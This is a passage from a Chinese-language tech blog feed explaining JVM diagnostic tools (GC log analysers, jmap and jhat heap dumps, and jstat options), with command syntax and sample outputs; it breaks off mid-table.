的次数、GC的时间、GC的开销、最大GC时间和最小GC时间等，以及相应的柱状图</li><li>GC Pause Distribution:查看GC停顿的详细分布，x轴表示垃圾收集停顿时间，y轴表示是停顿次数。</li><li>GC Timeline：显示整个时间线上的垃圾收集</li></ul></blockquote><p>不过这款工具已经不再维护，不能识别最新jdk的日志文件。</p><h3 id="GCViewer"><a href="#GCViewer" class="headerlink" title="GCViewer"></a>GCViewer</h3><p>GCViewer也是一款分析小工具，用于可视化查看由Sun / Oracle, IBM, HP 和 BEA Java 虚拟机产生的垃圾收集器的日志，gcviewer个人感觉显示 的界面比较乱没有GChisto更专业一些。</p><h3 id="GC-Easy"><a href="#GC-Easy" class="headerlink" title="GC Easy"></a>GC Easy</h3><p>这是一个web工具,在线使用非常方便.</p><p>地址: <a href="http://gceasy.io">http://gceasy.io</a></p><p>进入官网，讲打包好的zip或者gz为后缀的压缩包上传，过一会就会拿到分析结果。</p><p><a href="http://www.ityouknow.com/java/2017/02/22/jvm-tool.html">原文地址</a></p>]]></content>
    
    <summary type="html">
    
      jconsole 自jdk 1.5开始。jvisualvm 自jdk 1.6开始集成。
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="jvm" scheme="https://blog.yanzhe.tk/tags/jvm/"/>
    
      <category term="jdk" scheme="https://blog.yanzhe.tk/tags/jdk/"/>
    
  </entry>
  
  <entry>
    <title>jdk jmap jhat 产生并分析dump文件</title>
    <link href="https://blog.yanzhe.tk/2017/11/01/jdk-jmap-jhat/"/>
    <id>https://blog.yanzhe.tk/2017/11/01/jdk-jmap-jhat/</id>
    <published>2017-11-01T09:03:50.000Z</published>
    <updated>2020-08-23T01:48:10.243Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ul><li>如果程序内存不足或者频繁GC，很有可能存在内存泄露情况，这时候就要借助Java堆Dump查看对象的情况。</li><li>使用jmap -histo:[live]查看堆内存中的对象的情况。如果有大量对象在持续被引用，并没有被释放掉，那就产生了内存泄露，就要结合代码，把不用的对象释放掉。</li><li>在内存出现泄露、溢出或者其它前提条件下，建议多dump几次内存，把内存文件进行编号归档，便于后续内存整理分析。</li><li>64位机上使用需要使用如下方式：<code>jmap -J-d64 -heap pid</code></li></ul></blockquote><h2 id="制作Java-Dump"><a href="#制作Java-Dump" class="headerlink" title="制作Java Dump"></a>制作Java Dump</h2><h3 id="Java-Dump-简介"><a href="#Java-Dump-简介" class="headerlink" title="Java Dump 简介"></a>Java Dump 简介</h3><p>Java虚拟机的运行时快照。将Java虚拟机运行时的状态和信息保存到文件。</p><blockquote><ul><li>线程Dump,包含所有线程的运行状态。纯文本格式。</li></ul></blockquote><blockquote><ul><li>堆Dump,包含线程Dump,幵包含所有堆对象的状态。二进制格式。堆Dump是反应Java堆使用情况的内存镜像，其中主要包括系统信息、虚拟机属性、完整的线程Dump、所有类和对象的状态等。 一般，在内存不足、GC异常等情况下，我们就会怀疑有内存泄露。这个时候我们就可以制作堆Dump来查看具体情况。分析原因。</li></ul></blockquote><p>补足传统Bug分析手段的不足: 可在任何Java环境使用;信息量充足。 针对非功能正确性的Bug,主要为:多线程幵发、内存泄漏。</p><h3 id="使用Java虚拟机制作Dump"><a href="#使用Java虚拟机制作Dump" class="headerlink" title="使用Java虚拟机制作Dump"></a>使用Java虚拟机制作Dump</h3><p>指示虚拟机出现OOM，即虚拟机在发生内存不足错误时,自动生成堆Dump<br><code>-XX:+HeapDumpOnOutOfMemoryError</code></p><h3 id="使用图形化工具制作Dump"><a href="#使用图形化工具制作Dump" class="headerlink" title="使用图形化工具制作Dump"></a>使用图形化工具制作Dump</h3><p>使用JDK(1.6)自带的工具:Java VisualVM。<br>使用 jconsole 选项通过 HotSpotDiagnosticMXBean 从运行时获得堆转储（生成dump文件）。</p><h3 id="使用命令行制作Dump"><a href="#使用命令行制作Dump" class="headerlink" title="使用命令行制作Dump"></a>使用命令行制作Dump</h3><p>jstack:打印线程的栈信息,制作线程Dump。</p><p>jmap:打印内存映射,制作堆Dump。<br>这个命令执行，JVM会将整个heap的信息dump写入到一个文件，heap如果比较大的话，就会导致这个过程比较耗时，并且执行的过程中为了保证dump的信息是可靠的，所以会暂停应用。</p><h2 id="jmap-产生dump文件-信息"><a href="#jmap-产生dump文件-信息" class="headerlink" title="jmap 产生dump文件/信息"></a>jmap 产生dump文件/信息</h2><p>jmap(JVM Memory Map)命令用于生成heap dump文件,打印出某个java进程（使用pid）内存内的，所有‘对象’的情况（如：产生那些对象，及其数量）.还阔以查询finalize执行队列、Java堆和永久代的详细信息，如当前使用率、当前使用的是哪种收集器等。</p><h3 id="jmap命令格式"><a href="#jmap命令格式" class="headerlink" title="jmap命令格式"></a>jmap命令格式</h3><blockquote><ul><li><code>jmap [option] &lt;pid&gt;</code><pre><code>(to connect to running process)</code></pre></li><li><code>jmap [option] &lt;executable &lt;core&gt;</code><pre><code>(to connect to a core file)</code></pre></li><li><code>jmap [option] [server_id@]&lt;remote server IP or hostname&gt;</code><pre><code>(to connect to remote debug server)</code></pre></li></ul></blockquote><p><code>executable</code> Java executable from which the core dump was produced.<br>(可能是产生core dump的java可执行程序)<br><code>core</code> 将被打印信息的core dump文件<br><code>remote-hostname-or-IP</code> 远程debug服务的主机名或ip<br><code>server-id</code> 唯一id,假如一台主机上多个远程debug服务 ，用此选项参数标识服务器。<br><code>pid</code> 需要打印配置信息的进程ID。该进程必须是一个Java进程。想要获取运行的Java进程列表，你可以使用jps。</p><h3 id="jmap-option参数"><a href="#jmap-option参数" class="headerlink" title="jmap option参数"></a>jmap option参数</h3><blockquote><ul><li><none>如果使用不带选项参数的jmap打印共享对象映射，将会打印目标虚拟机中加载的每个共享对象的起始地址、映射大小以及共享对象文件的路径全称。这与Solaris的pmap工具比较相似。</none></li><li>-dump:[live,]format=b,file=<filename>使用hprof二进制形式,输出jvm的heap内容到文件中. live子选项是可选的，假如指定live选项,那么只输出活的对象到文件. 想要浏览heap dump，你可以使用jhat(Java堆分析工具)读取生成的文件。这个命令执行，JVM会将整个heap的信息dump写入到一个文件，heap如果比较大的话，就会导致这个过程比较耗时，并且执行的过程中为了保证dump的信息是可靠的，所以会暂停应用。</filename></li><li>-finalizerinfo 打印正等候回收的对象的信息.</li><li>-heap 打印heap的概要信息，GC使用的算法，heap的配置及wise heap的使用情况.查看java 堆（heap）使用情况</li><li>-histo[:live] 打印堆的柱状图。打印每个class的实例数目,内存占用,类全名信息. VM的内部类名字开头会加上前缀”*”. 如果live子参数加上后,只统计活的对象数量. 查看堆内存(histogram)中的对象数量及大小。</li><li>-permstat 打印classload和jvm heap长久层的信息. 包含每个classloader的名字,活泼性,地址,父classloader和加载的class数量和占用内存.另外,内部String的数量和占用内存数也会打印出来.</li><li>-F 强制模式。如果指定的pid没有响应，请使用<code>jmap -dump</code>或<code>jmap -histo</code>选项。在这个模式下,live子参数无效. 当-dump没有响应时，强制生成dump快照</li><li>-h | -help 打印辅助信息</li><li>-J 传递参数给jmap启动的jvm.</li></ul></blockquote><h3 id="jmap示例"><a href="#jmap示例" class="headerlink" title="jmap示例"></a>jmap示例</h3><p>-heap<br>打印heap的概要信息，GC使用的算法，heap的配置及wise heap的使用情况,可以用此来判断内存目前的使用情况以及垃圾回收情况。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> jmap -heap 28920</span></span><br><span class="line">  Attaching to process ID 28920, please wait...</span><br><span class="line">  Debugger attached successfully.</span><br><span class="line">  Server compiler detected.</span><br><span class="line">  JVM version is 24.71-b01  </span><br><span class="line"></span><br><span class="line">  using thread-local object allocation.</span><br><span class="line">  Parallel GC with 4 thread(s)//GC 方式  </span><br><span class="line"></span><br><span class="line">  Heap Configuration: //堆内存初始化配置</span><br><span class="line">     MinHeapFreeRatio = 0 //对应jvm启动参数-XX:MinHeapFreeRatio设置JVM堆最小空闲比率(default 40)</span><br><span class="line">     MaxHeapFreeRatio = 100 //对应jvm启动参数 -XX:MaxHeapFreeRatio设置JVM堆最大空闲比率(default 70)</span><br><span class="line">     MaxHeapSize      = 2082471936 (1986.0MB) //对应jvm启动参数-XX:MaxHeapSize=设置JVM堆的最大大小</span><br><span class="line">     NewSize          = 1310720 (1.25MB)//对应jvm启动参数-XX:NewSize=设置JVM堆的‘新生代’的默认大小</span><br><span class="line">     MaxNewSize       = 17592186044415 MB//对应jvm启动参数-XX:MaxNewSize=设置JVM堆的‘新生代’的最大大小</span><br><span class="line">     OldSize          = 5439488 (5.1875MB)//对应jvm启动参数-XX:OldSize=&lt;value&gt;:设置JVM堆的‘老生代’的大小</span><br><span class="line">     NewRatio         = 2 //对应jvm启动参数-XX:NewRatio=:‘新生代’和‘老生代’的大小比率</span><br><span class="line">     SurvivorRatio    = 8 //对应jvm启动参数-XX:SurvivorRatio=设置年轻代中Eden区与Survivor区的大小比值 </span><br><span class="line">     PermSize         = 21757952 (20.75MB)  //对应jvm启动参数-XX:PermSize=&lt;value&gt;:设置JVM堆的‘永生代’的初始大小</span><br><span class="line">     MaxPermSize      = 85983232 (82.0MB)//对应jvm启动参数-XX:MaxPermSize=&lt;value&gt;:设置JVM堆的‘永生代’的最大大小</span><br><span class="line">     G1HeapRegionSize = 0 (0.0MB)  </span><br><span class="line"></span><br><span class="line">  Heap Usage://堆内存使用情况</span><br><span class="line">  PS Young Generation</span><br><span class="line">  Eden Space://Eden区内存分布</span><br><span class="line">     capacity = 33030144 (31.5MB)//Eden区总容量</span><br><span class="line">     used     = 1524040 (1.4534378051757812MB)  //Eden区已使用</span><br><span class="line">     free     = 31506104 (30.04656219482422MB)  //Eden区剩余容量</span><br><span class="line">     4.614088270399305% used //Eden区使用比率</span><br><span class="line">  From Space:  //其中一个Survivor区的内存分布</span><br><span class="line">     capacity = 5242880 (5.0MB)</span><br><span class="line">     used     = 0 (0.0MB)</span><br><span class="line">     free     = 5242880 (5.0MB)</span><br><span class="line">     0.0% used</span><br><span class="line">  To Space:  //另一个Survivor区的内存分布</span><br><span class="line">     capacity = 5242880 (5.0MB)</span><br><span class="line">     used     = 0 (0.0MB)</span><br><span class="line">     free     = 5242880 (5.0MB)</span><br><span class="line">     0.0% used</span><br><span class="line">  PS Old Generation //当前的Old区内存分布</span><br><span class="line">     capacity = 86507520 (82.5MB)</span><br><span class="line">     used     = 0 (0.0MB)</span><br><span class="line">     free     = 86507520 (82.5MB)</span><br><span class="line">     0.0% used</span><br><span class="line">  PS Perm Generation//当前的 “永生代” 内存分布</span><br><span class="line">     capacity = 22020096 (21.0MB)</span><br><span class="line">     used     = 2496528 (2.3808746337890625MB)</span><br><span class="line">     free     = 19523568 (18.619125366210938MB)</span><br><span class="line">     11.337498256138392% used  </span><br><span class="line"></span><br><span class="line">  670 interned Strings occupying 43720 bytes.</span><br></pre></td></tr></table></figure><p>可以很清楚的看到Java堆中各个区域目前的情况。</p><p>-histo<br>打印堆的对象统计，包括对象数、内存大小等等 （因为在dump:live前会进行full gc，如果带上live则只统计活对象，因此不加live的堆大小要大于加live堆的大小 ）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> jmap -histo:live 28920 | more</span></span><br><span class="line"> num     #instances         #bytes  class name</span><br><span class="line">----------------------------------------------</span><br><span class="line">   1:         83613       12012248  &lt;constMethodKlass&gt;</span><br><span class="line">   2:         23868       11450280  [B</span><br><span class="line">   3:         83613       10716064  &lt;methodKlass&gt;</span><br><span class="line">   4:         76287       10412128  [C</span><br><span class="line">   5:          8227        9021176  &lt;constantPoolKlass&gt;</span><br><span class="line">   6:          8227        5830256  &lt;instanceKlassKlass&gt;</span><br><span class="line">   7:          7031        5156480  &lt;constantPoolCacheKlass&gt;</span><br><span class="line">   8:         73627        1767048  java.lang.String</span><br><span class="line">   9:          2260        1348848  &lt;methodDataKlass&gt;</span><br><span class="line">  10:          8856         849296  java.lang.Class</span><br><span class="line">  ....</span><br></pre></td></tr></table></figure><p>仅仅打印了前10行</p><p><code>xml class name</code>是对象类型，说明如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">B  byte</span><br><span class="line">C  char</span><br><span class="line">D  double</span><br><span class="line">F  float</span><br><span class="line">I  int</span><br><span class="line">J  long</span><br><span class="line">Z  boolean</span><br><span class="line">[  数组，如[I表示int[]</span><br><span class="line">[L+类名 其他对象</span><br></pre></td></tr></table></figure><p>64位机上使用需要使用如下方式：<br><code>jmap -J-d64 -heap pid</code></p><h2 id="jhat-解析dump并启动浏览器"><a href="#jhat-解析dump并启动浏览器" class="headerlink" title="jhat 解析dump并启动浏览器"></a>jhat 解析dump并启动浏览器</h2><p>jhat(JVM Heap Analysis Tool)命令是与jmap搭配使用，用来分析jmap生成的dump，jhat内置了一个微型的HTTP/HTML服务器，生成dump的分析结果后，可以在浏览器中查看。在此要注意，一般不会直接在服务器上进行分析，因为jhat是一个耗时并且耗费硬件资源的过程，一般把服务器生成的dump文件复制到本地或其他机器上进行分析。</p><h3 id="jhat命令格式"><a href="#jhat命令格式" class="headerlink" title="jhat命令格式"></a>jhat命令格式</h3><p><code>jhat [-stack &lt;bool&gt;] [-refs &lt;bool&gt;] [-port &lt;port&gt;] [-baseline &lt;file&gt;] [-debug &lt;int&gt;] [-version] [-h|-help] &lt;file&gt;</code></p><h3 id="jhat-option参数"><a href="#jhat-option参数" class="headerlink" title="jhat option参数"></a>jhat option参数</h3><blockquote><ul><li>-stack false|true 关闭对象分配调用栈跟踪(tracking object allocation call stack)。 如果分配位置信息在堆转储中不可用. 则必须将此标志设置为 false. 默认值为 true.&gt;</li><li>-refs false|true 关闭对象引用跟踪(tracking of references to objects)。 默认值为 true. 默认情况下, 返回的指针是指向其他特定对象的对象,如反向链接或输入引用(referrers or incoming references), 会统计/计算堆中的所有对象。</li><li>-port port-number 设置 jhat HTTP server 的端口号. 默认值 7000.</li><li>-exclude exclude-file 指定对象查询时需要排除的数据成员列表文件(a file that lists data members that should be excluded from the reachable objects query)。 例如, 如果文件列列出了 java.lang.String.value , 那么当从某个特定对象 Object o 计算可达的对象列表时, 引用路径涉及 java.lang.String.value 的都会被排除。</li><li>-baseline exclude-file 指定一个基准堆转储(baseline heap dump)。 在两个 heap dumps 中有相同 object ID 的对象会被标记为不是新的(marked as not being new). 其他对象被标记为新的(new). 在比较两个不同的堆转储时很有用.</li><li>-debug int 设置 debug 级别. 0 表示不输出调试信息。 值越大则表示输出更详细的 debug 信息.</li><li>-version 启动后只显示版本信息就退出</li><li>-J&lt; flag &gt; 因为 jhat 命令实际上会启动一个JVM来执行, 通过 -J 可以在启动JVM时传入一些启动参数. 例如, -J-Xmx512m 则指定运行 jhat 的Java虚拟机使用的最大堆内存为 512 MB. 如果需要使用多个JVM启动参数,则传入多个 -Jxxxxxx.</li></ul></blockquote><p>分析同样一个dump快照，MAT需要的额外内存比jhat要小的多的多，所以建议使用MAT来进行分析，当然也看个人偏好。</p><h3 id="浏览页面dump信息"><a href="#浏览页面dump信息" class="headerlink" title="浏览页面dump信息"></a>浏览页面dump信息</h3><p>该页面提供了几个查询功能可供使用：</p><blockquote><ul><li>All classes including platform 显示出堆中所包含的所有的类</li><li>Show all members of the rootset 从根集能引用到的对象</li><li>Show instance counts for all classes (including platform) 显示平台包括的所有类的实例数量</li><li>Show instance counts for all classes (excluding platform)</li><li>Show heap histogram 堆实例的分布表</li><li>Show finalizer summary</li><li>Execute Object Query Language (OQL) query 执行对象查询语句</li></ul></blockquote><p>一般查看堆异常情况主要看这个两个部分：<br>Show instance counts for all classes (excluding platform)，平台外的所有对象信息。</p><p>Show heap histogram 以树状图形式展示堆情况。</p><p>具体排查时需要结合代码，观察是否大量应该被回收的对象在一直被引用或者是否有占用内存特别大的对象无法被回收。</p><h3 id="jhat-OQL"><a href="#jhat-OQL" class="headerlink" title="jhat OQL"></a>jhat OQL</h3><p>jhat还提供了一种对象查询语言(Object Query Language)，OQL有点类似SQL,可以用来查询。</p><p>OQL语句的执行页面: <a href="http://localhost:7000/oql/">http://localhost:7000/oql/</a></p><p>OQL帮助信息页面为: <a href="http://localhost:7000/oqlhelp/">http://localhost:7000/oqlhelp/</a></p><p>OQL的预发可以在帮助页面查看，这里就不详细讲解了。</p><p><a href="http://www.importnew.com/18236.html">jhat</a></p>]]></content>
    
    <summary type="html">
    
      jmap生成dump文件`jmap -dump:live,format=b,file=&lt;filename,dump.hprof&gt; &lt;pid&gt;`(如heap比较大，将暂停&lt;pid&gt;应用)，jhat查看`jhat [-port 5000] [-J-Xmx512m] heapDump`(在浏览器中访问：http://localhost:5000/查看详细信息)，或使用MAT查看(Memory Analyzer Tool,Eclipse插件)
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="jvm" scheme="https://blog.yanzhe.tk/tags/jvm/"/>
    
      <category term="jdk" scheme="https://blog.yanzhe.tk/tags/jdk/"/>
    
  </entry>
  
  <entry>
    <title>jdk命令jstat监视虚拟机运行时状态信息</title>
    <link href="https://blog.yanzhe.tk/2017/10/30/jdk-jstat/"/>
    <id>https://blog.yanzhe.tk/2017/10/30/jdk-jstat/</id>
    <published>2017-10-30T09:07:40.000Z</published>
    <updated>2020-08-23T01:48:10.247Z</updated>
    
    <content type="html"><![CDATA[<h2 id="jstat简介"><a href="#jstat简介" class="headerlink" title="jstat简介"></a>jstat简介</h2><p>jstat命令(Java Virtual Machine Statistics Monitoring Tool)用于监控基于HotSpot的JVM，对其堆的使用情况进行实时的命令行的统计，使用jstat我们可以对指定的JVM做如下监控：</p><ul><li>类的加载及卸载情况</li><li>查看新生代、老生代及持久代的容量及使用情况</li><li>查看新生代、老生代及持久代的垃圾收集情况，包括垃圾回收的次数及垃圾回收所占用的时间</li><li>查看新生代中Eden区及Survior区中容量及分配情况等<br>jstat工具特别强大，它有众多的可选项，通过提供多种不同的监控维度，使我们可以从不同的维度来了解到当前JVM堆的使用情况。详细查看堆内各个部分的使用量，使用的时候必须加上待统计的Java进程号，可选的不同维度参数以及可选的统计频率参数。<br>它主要是用来显示GC及PermGen相关的信息，如果对GC不怎么了解，先看<a href="http://blog.csdn.net/fenglibing/archive/2011/04/13/6321453.aspx">这篇文章</a>否则其中即使你会使用jstat这个命令，你也看不懂它的输出。</li></ul><h2 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h2><p><code>jstat [ generalOption | outputOptions vmid [interval[s|ms] [count]] ]</code></p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>generalOption - 单个的常用的命令行选项，如-help, -options, 或 -version。<br>outputOptions - 一个或多个输出选项，由单个的statOption选项组成，可以和-t, -h, and -J等选项配合使用。</p><ul><li>-h<lines>用于指定每隔几行就输出列头，如果不指定，默认是只在第一行出现列头。</lines></li><li>-t<lines>用于在输出内容的第一列显示时间戳，这个时间戳代表的时JVM开始启动到现在的时间（注：在IBM JDK5中是没有这个选项的）。</lines></li><li>vmid VM的进程号，即当前运行的java进程号。</li><li>interval 间隔时间，单位可以是秒或者毫秒，通过指定s或ms确定，默认单位为毫秒。</li><li>count 打印次数，如果缺省则打印无数次。</li><li>-J<flag>用于将给定的<flag>传给java应用程序加载器，例如，“-J-Xms48m”将把启动内存设置为48M。如果想查看可以传递哪些选项到应用程序加载器中，可以相看如下的文档：<pre><code>Linux and Solaris：http://docs.oracle.com/javase/1.5.0/docs/tooldocs/solaris/java.htmlWindows： http://docs.oracle.com/javase/1.5.0/docs/tooldocs/windows/java.html</code></pre></flag></flag></li><li>statOption：根据jstat统计的维度不同，可以使用如下表中的选项进行不同维度的统计，不同的操作系统支持的选项可能会不一样，可以通过-options选项，查看不同操作系统所支持选项。</li></ul><p>参数interval和count代表查询间隔和次数，如果省略这两个参数，说明只查询一次。<br>假设需要每250毫秒查询一次进程5828垃圾收集状况，一共查询5次，那命令行如下：<br><code>jstat -gc 5828 250 5</code></p><h3 id="options参数说明"><a href="#options参数说明" class="headerlink" title="options参数说明"></a>options参数说明</h3><p>选项option代表这用户希望查询的虚拟机信息，主要分为3类：类装载、垃圾收集和运行期编译状况，具体选项及作用如下：</p><p><code>jstat -class &lt;pid&gt;</code><br>eg:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jstat -class 11589</span><br><span class="line"> Loaded  Bytes  Unloaded  Bytes     Time   </span><br><span class="line">  7035  14506.3     0     0.0       3.67</span><br></pre></td></tr></table></figure><p><code>jstat -gc 1262 2000 20</code><br>这个命令意思就是每隔2000ms输出1262的gc情况，一共输出20次<br>输出，C即Capacity 总容量，U即Used 已使用的容量</p><p><code>jstat -gccause 进程pid</code><br>查看进程垃圾收集原因</p><table><thead><tr><th>Option</th><th>列名</th><th>Displays</th></tr></thead><tbody><tr><td>–class</td><td></td><td>监视类装载、卸载数量、总空间及类装载所耗费的时间</td></tr><tr><td></td><td>Loaded</td><td>加载了的类的数量</td></tr><tr><td></td><td>Bytes</td><td>加载了的类的大小，单为Kb</td></tr><tr><td></td><td>Unloaded</td><td>卸载了的类的数量</td></tr><tr><td></td><td>Bytes</td><td>卸载了的类的大小，单为Kb</td></tr><tr><td></td><td>Time</td><td>花在类的加载及卸载的时间</td></tr><tr><td>-compiler</td><td></td><td>查看HotSpot中即时编译器编译情况的统计,输出JIT编译器编译过的方法、耗时等信息</td></tr><tr><td></td><td>Compiled</td><td>编译任务执行的次数</td></tr><tr><td></td><td>Failed</td><td>编译任务执行失败的次数</td></tr><tr><td></td><td>Invalid</td><td>编译任务非法执行的次数</td></tr><tr><td></td><td>Time 执行</td><td>编译花费的时间</td></tr><tr><td></td><td>FailedType</td><td>最后一次编译失败的编译类型</td></tr><tr><td></td><td>FailedMethod</td><td>最后一次编译失败的类名及方法名</td></tr><tr><td>-gc</td><td></td><td>查看JVM中堆的垃圾收集情况的统计,监视Java堆状况，包括Eden区、2个Survivor区、老年代、永久代等的容量</td></tr><tr><td></td><td>S0C</td><td>新生代中Survivor space中S0当前容量的大小（KB）</td></tr><tr><td></td><td>S1C</td><td>新生代中Survivor space中S1当前容量的大小（KB）</td></tr><tr><td></td><td>S0U</td><td>新生代中Survivor space中S0容量使用的大小（KB）</td></tr><tr><td></td><td>S1U</td><td>新生代中Survivor space中S1容量使用的大小（KB）</td></tr><tr><td></td><td>EC</td><td>Eden space当前容量的大小（KB）</td></tr><tr><td></td><td>EU</td><td>Eden space容量使用的大小（KB）</td></tr><tr><td></td><td>OC</td><td>Old space当前容量的大小（KB）</td></tr><tr><td></td><td>OU</td><td>Old space使用容量的大小（KB）</td></tr><tr><td></td><td>PC</td><td>Permanent space当前容量的大小（KB）</td></tr><tr><td></td><td>PU</td><td>Permanent space使用容量的大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>YGCT</td><td>从应用程序启动到采样时 Young GC 所用的时间(秒)</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td></td><td>FGCT</td><td>从应用程序启动到采样时 Full GC 所用的时间(秒)</td></tr><tr><td></td><td>GCTT</td><td>从应用程序启动到采样时用于垃圾回收的总时间(单位秒)，它的值等于YGC+FGC</td></tr><tr><td>-gccapacity</td><td></td><td>监视内容与-gc基本相同，但输出主要关注Java堆各个区域使用到的最大和最小空间,查看新生代、老生代及持久代的存储容量情况</td></tr><tr><td></td><td>NGCMN</td><td>新生代的最小容量大小（KB）</td></tr><tr><td></td><td>NGCMX</td><td>新生代的最大容量大小（KB）</td></tr><tr><td></td><td>NGC</td><td>当前新生代的容量大小（KB）</td></tr><tr><td></td><td>S0C</td><td>当前新生代中survivor space 0的容量大小（KB）</td></tr><tr><td></td><td>S1C</td><td>当前新生代中survivor space 1的容量大小（KB）</td></tr><tr><td></td><td>EC</td><td>Eden space当前容量的大小（KB）</td></tr><tr><td></td><td>OGCMN</td><td>老生代的最小容量大小（KB）</td></tr><tr><td></td><td>OGCMX</td><td>老生代的最大容量大小（KB）</td></tr><tr><td></td><td>OGC</td><td>当前老生代的容量大小（KB）</td></tr><tr><td></td><td>OC</td><td>当前老生代的空间容量大小（KB）</td></tr><tr><td></td><td>PGCMN</td><td>持久代的最小容量大小（KB）</td></tr><tr><td></td><td>PGCMX</td><td>持久代的最大容量大小（KB）</td></tr><tr><td></td><td>PGC</td><td>当前持久代的容量大小（KB）</td></tr><tr><td></td><td>PC</td><td>当前持久代的空间容量大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td>-gcutil</td><td></td><td>监视内容与-gc基本相同，但输出主要关注已使用空间占总空间的百分比,查看新生代、老生代及持代垃圾收集的情况</td></tr><tr><td></td><td>S0</td><td>Heap上的 Survivor space 0 区已使用空间的百分比</td></tr><tr><td></td><td>S1</td><td>Heap上的 Survivor space 1 区已使用空间的百分比</td></tr><tr><td></td><td>E</td><td>Heap上的 Eden space 区已使用空间的百分比</td></tr><tr><td></td><td>O</td><td>Heap上的 Old space 区已使用空间的百分比</td></tr><tr><td></td><td>P</td><td>Perm space 区已使用空间的百分比</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>YGCT</td><td>从应用程序启动到采样时 Young GC 所用的时间(单位秒)</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td></td><td>FGCT</td><td>从应用程序启动到采样时 Full GC 所用的时间(单位秒)</td></tr><tr><td></td><td>GCT</td><td>从应用程序启动到采样时用于垃圾回收的总时间(单位秒)，它的值等于YGC+FGC</td></tr><tr><td>-gccause</td><td></td><td>与-gcutil功能一样，但是会额外输出导致上一次/当前GC产生的原因.</td></tr><tr><td></td><td>LGCC</td><td>最后一次垃圾收集的原因，可能为“unknown GCCause”、“System.gc()”等</td></tr><tr><td></td><td>GCC</td><td>当前垃圾收集的原因</td></tr><tr><td>–gcnew</td><td></td><td>监视新生代GC的状况 .</td></tr><tr><td></td><td>S0C</td><td>当前新生代中survivor space 0的容量大小（KB）</td></tr><tr><td></td><td>S1C</td><td>当前新生代中survivor space 1的容量大小（KB）</td></tr><tr><td></td><td>S0U</td><td>S0已经使用的大小（KB）</td></tr><tr><td></td><td>S1U</td><td>S1已经使用的大小（KB）</td></tr><tr><td></td><td>TT</td><td>Tenuring threshold，要了解这个参数，我们需要了解一点Java内存对象的结构，在Sun JVM中，（除了数组之外的）对象都有两个机器字（words）的头部。第一个字中包含这个对象的标示哈希码以及其他一些类似锁状态和等标识信息，第二个字中包含一个指向对象的类的引用，其中第二个字节就会被垃圾收集算法使用到。在新生代中做垃圾收集的时候，每次复制一个对象后，将增加这个对象的收集计数，当一个对象在新生代中被复制了一定次数后，该算法即判定该对象是长周期的对象 ，把他移动到老生代，这个阈值叫着tenuring threshold。这个阈值用于表示某个/些在执行批定次数youngGC后还活着的对象，即使此时新生的的Survior没有满，也同样被认为是长周期对象，将会被移到老生代中。</td></tr><tr><td></td><td>MTT</td><td>Maximum tenuring threshold，用于表示TT的最大值。</td></tr><tr><td></td><td>DSS</td><td>Desired survivor size (KB).可以参与这里：<a href="http://blog.csdn.net/yangjun2/article/details/6542357">http://blog.csdn.net/yangjun2/article/details/6542357</a></td></tr><tr><td></td><td>EC</td><td>Eden space当前容量的大小（KB）</td></tr><tr><td></td><td>EU</td><td>Eden space已经使用的大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>YGCT</td><td>从应用程序启动到采样时 Young GC 